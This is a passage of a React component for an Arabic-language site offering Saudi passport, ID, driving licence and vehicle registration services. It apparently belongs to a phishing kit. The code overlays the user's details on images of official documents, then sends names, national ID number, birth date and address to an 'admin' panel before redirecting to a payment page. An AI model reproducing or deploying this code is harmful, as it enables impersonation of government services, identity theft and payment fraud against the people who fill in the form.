                    return `${hY}/${String(hM).padStart(2, '0')}/${String(hD).padStart(2, '0')}`.replace(/[0-9]/g, (d: string) => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                  })()}</span>
                  <span style={{direction: 'ltr'}}>Exp {(() => {
                    const today = new Date();
                    const exp = new Date(today.getFullYear() + 10, today.getMonth(), today.getDate());
                    return exp.toLocaleDateString('en-GB');
                  })()}</span>
                </div>
                {/* Row 4: Blood Type / تاريخ الاصدار */}
                <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '2px'}}>
                  <span style={{direction: 'rtl'}}>تاريخ الاصدار {(() => {
                    const today = new Date();
                    const gY = today.getFullYear();
                    const gM = today.getMonth() + 1;
                    const gD = today.getDate();
                    const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) + Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) - Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) + gD - 32075;
                    const l = jd - 1948440 + 10632;
                    const n = Math.floor((l - 1) / 10631);
                    const l2 = l - 10631 * n + 354;
                    const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) + Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                    const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) - Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                    const hM = Math.floor((24 * l3) / 709);
                    const hD = l3 - Math.floor((709 * hM) / 24);
                    const hY = 30 * n + j - 30;
                    return `${hY}/${String(hM).padStart(2, '0')}/${String(hD).padStart(2, '0')}`.replace(/[0-9]/g, (d: string) => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                  })()}</span>
                  <span style={{direction: 'ltr'}}>{bloodType} فصيلة الدم</span>
                </div>
                {/* Row 5: القيود / النوع */}
                <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '2px'}}>
                  <span style={{direction: 'rtl'}}>النوع <strong>{licenseType}</strong></span>
                  <span>القيود بلا قيود</span>
                </div>
                {/* Row 6: الجنسية */}
                <div style={{display: 'flex', justifyContent: 'space-between'}}>
                  <span style={{direction: 'rtl'}}>الجنسية <strong>{nationality}</strong></span>
                  <span></span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Part 5: Vehicle Registration */}
        <div className={`mb-8 ${showVehicleLicense ? '' : 'hidden'}`}>
          {/* Title hidden as per requirements */}
          <div className="flex justify-center">
            <div className="relative" style={{width: '600px', maxWidth: '100%'}}>
              {/* Vehicle Registration Background */}
              <img 
                src="/saudi-vehicle-registration.png" 
                alt="استمارة المركبة" 
                className="w-full h-auto rounded-lg shadow-lg"
              />
              
              {/* Dynamic Data Overlay - البيانات الديناميكية */}
              
              {/* Row 1: اسم المالك - حقل عريض على اليمين */}
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black whitespace-nowrap overflow-hidden" style={{top: '29%', right: '20%', width: '40%', textAlign: 'center', direction: 'rtl'}}>
                {arabicFirstName && arabicSecondName && arabicThirdName && arabicFourthName 
                  ? `${arabicFirstName} ${arabicSecondName} ${arabicThirdName} ${arabicFourthName}` 
                  : ''}
              </div>
              
              {/* Row 2: المستخدم - حقل عريض على اليمين */}
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black whitespace-nowrap overflow-hidden" style={{top: '36%', right: '20%', width: '40%', textAlign: 'center', direction: 'rtl'}}>
                {wantToAddUser ? (vehicleUserName || '.....................................') : '.....................................'}
              </div>
              
              {/* Row 3: هوية المالك (يمين) | هوية المستخدم (يسار) */}
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '45%', right: '25%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {nationalId || ''}
              </div>
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '45%', left: '10%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {wantToAddUser ? (vehicleUserId || '.....................................') : '.....................................'}
              </div>
              
              {/* Row 4: رقم الهيكل (يمين) | رقم اللوحة (يسار) */}
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '52%', right: '25%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {vehicleChassisNumber || ''}
              </div>
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '52%', left: '10%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {vehiclePlateLetter1 && vehiclePlateLetter2 && vehiclePlateLetter3 && vehiclePlateNumber 
                  ? (() => {
                      const getArabicLetter = (eng: string) => {
                        const letters: {[key: string]: string} = {'A': 'أ', 'B': 'ب', 'J': 'ح', 'D': 'د', 'R': 'ر', 'S': 'س', 'X': 'ص', 'T': 'ط', 'E': 'ع', 'G': 'ق', 'K': 'ك', 'L': 'ل', 'Z': 'م', 'N': 'ن', 'H': 'ه', 'U': 'و', 'V': 'ى'};
                        return letters[eng] || eng;
                      };
                      return `${vehiclePlateNumber} ${getArabicLetter(vehiclePlateLetter1)} ${vehiclePlateLetter1} ${getArabicLetter(vehiclePlateLetter2)} ${vehiclePlateLetter2} ${getArabicLetter(vehiclePlateLetter3)} ${vehiclePlateLetter3}`;
                    })()
                  : ''}
              </div>
              
              {/* Row 5: نوع التسجيل (يمين) | طراز المركبة (يسار) */}
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '59%', right: '25%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {vehicleRegistrationType || ''}
              </div>
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '59%', left: '10%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {vehicleModel || vehicleModelCustom || ''}
              </div>
              
              {/* Row 6: ماركة المركبة (يمين) | وزن المركبة (يسار) */}
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '67%', right: '25%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {vehicleBrand === 'أخرى' ? vehicleBrandCustom : vehicleBrand || ''}
              </div>
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '67%', left: '10%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {vehicleWeight || ''}
              </div>
              
              {/* Row 7: حمولة المركبة (يمين) | سنة الصنع (يسار) */}
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '75%', right: '25%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {vehicleLoad || ''}
              </div>
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '75%', left: '10%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {vehicleManufactureYear || ''}
              </div>
              
              {/* Row 8: الرقم التسلسلي (يمين) | تاريخ الإنتهاء (يسار) */}
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '82%', right: '25%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {vehicleSerialNumber || ''}
              </div>
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '82%', left: '10%', width: '18%', textAlign: 'center', direction: 'rtl'}}>
                {(() => {
                  const today = new Date();
                  const expiryDate = new Date(today.getFullYear() + 10, today.getMonth(), today.getDate());
                  const gY = expiryDate.getFullYear();
                  const gM = expiryDate.getMonth() + 1;
                  const gD = expiryDate.getDate();
                  // Convert to Hijri
                  const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) + Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) - Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) + gD - 32075;
                  const l = jd - 1948440 + 10632;
                  const n = Math.floor((l - 1) / 10631);
                  const l2 = l - 10631 * n + 354;
                  const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) + Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                  const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) - Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                  const hM = Math.floor((24 * l3) / 709);
                  const hD = l3 - Math.floor((709 * hM) / 24);
                  const hY = 30 * n + j - 30;
                  return `${hD}/${hM}/${hY}`;
                })()}
              </div>
              
              {/* Row 9: اللون (يمين فقط) */}
              <div className="absolute text-[6px] md:text-[12px] font-bold text-black" style={{top: '89%', right: '20%', width: '25%', textAlign: 'center', direction: 'rtl'}}>
                {vehicleColor || ''}
              </div>
            </div>
          </div>
        </div>
        
        {/* Declaration Section - Only visible after confirmation */}
        {confirmedService && (
          <div className="max-w-4xl mx-auto mt-8">
            <div className="flex flex-col gap-4">
              {/* Declaration Box - Full Width */}
              <div className="bg-white border border-gray-200 rounded-lg px-4 py-4 flex items-start gap-3 w-full">
                <div className="pt-1">
                  <input 
                    type="checkbox" 
                    id="declaration" 
                    checked={declarationChecked}
                    onChange={(e) => setDeclarationChecked(e.target.checked)}
                    className="w-5 h-5 text-green-600 rounded border-gray-300 focus:ring-green-500 cursor-pointer"
                  />
                </div>
                <div className="text-right">
                  <label htmlFor="declaration" className="text-gray-800 cursor-pointer select-none block mb-1" style={{fontSize: isMobile ? '12px' : '14px'}}>
                    أقر بصحة البيانات المدخلة وأوافق على الشروط والأحكام
                  </label>
                  <p className="text-gray-500" style={{fontSize: isMobile ? '10px' : '12px'}}>
                    بالنقر على المربع، فإنك توافق على شروط الخدمة وسياسة الخصوصية الخاصة بنا.
                  </p>
                </div>
              </div>
              
              {/* Button Below - Same size on the left */}
              <div className="flex justify-end">
                <Button 
                  onClick={() => {
                    setIsNavigating(true);
                    // Update page in admin panel
                    updatePage('صفحة الملخص والدفع');
                    navigateToPage('صفحة الملخص والدفع');
                    // Send data to admin before navigating
                    sendData({
                      current: 'صفحة الملخص والدفع',
                      data: {
                        'الخدمة': serviceName,
                        'الاسم بالعربي': `${arabicFirstName} ${arabicSecondName} ${arabicThirdName} ${arabicFourthName}`,
                        'الاسم بالإنجليزي': `${englishFirstName} ${englishSecondName} ${englishThirdName} ${englishFourthName}`,
                        'رقم الهوية': nationalId,
                        'الجنس': gender,
                        'تاريخ الميلاد': calendarType === 'gregorian' && dateOfBirth ? dateOfBirth.toLocaleDateString('ar-SA') : `${hijriDate.day}/${hijriDate.month}/${hijriDate.year} هـ`,
                        'المحافظة': province,
                        'المنطقة': district,
                        'اسم الشارع': streetName,
                        'رقم المبنى': buildingNumber,
                        'الدور': floorNumber,
                        'الإقرار': 'تم الموافقة'
                      },
                      waitingForAdminResponse: false
                    });
                    // Wait 3 seconds then navigate
                    setTimeout(() => {
                      navigate('/summary-payment?service=' + encodeURIComponent(serviceName));
                    }, 3000);
                  }}
                  className="bg-green-600 hover:bg-green-700 text-white px-4 md:px-8 py-1.5 md:py-2 text-xs md:text-sm min-w-[100px] md:min-w-[150px]"
                  disabled={!declarationChecked || isNavigating}
                >
                  {isNavigating ? (
                    <div className="flex items-center gap-2">
                      <svg className="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      <span>جاري المعالجة...</span>
                    </div>
                  ) : 'اعتماد ومتابعة'}
                </Button>
              </div>
            </div>
          </div>
        )}
      </main>
      
      {/* Confirmation Popup */}
      {showConfirmPopup && (
        <div className="fixed inset-0 bg-black/30 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="bg-white rounded-xl shadow-2xl p-4 md:p-8 max-w-sm md:max-w-md mx-4 text-center border border-gray-200">
            <h3 className="text-base md:text-xl font-bold text-gray-800 mb-2 md:mb-4">تأكيد البيانات</h3>
            <p className="text-gray-600 mb-3 md:mb-6 text-sm md:text-base">هل أنت متأكد من صحة البيانات المدخلة؟ لن تتمكن من التعديل بعد التأكيد.</p>
            <div className="flex gap-4 justify-center">
              <Button
                onClick={() => {
                  setShowConfirmPopup(false);
                  setIsFormLocked(true);
                  // Set confirmed service based on service type
                  if (isPassportService) {
                    setConfirmedService('passport');
                  } else if (isNationalIdService) {
                    setConfirmedService('nationalId');
                  } else if (isDrivingLicenseService) {
                    setConfirmedService('drivingLicense');
                  } else if (isVehicleLicenseService) {
                    setConfirmedService('vehicleLicense');
                  }
                  // Scroll to top
                  window.scrollTo({ top: 0, behavior: 'smooth' });
                }}
                className="bg-green-600 hover:bg-green-700 text-white px-6 py-2"
              >
                تأكيد
              </Button>
              <Button
                onClick={() => setShowConfirmPopup(false)}
                variant="outline"
                className="px-6 py-2"
              >
                إلغاء
              </Button>
            </div>
          </div>
        </div>
      )}
      
      <Footer />
    </div>
  );
};

export default Documents;
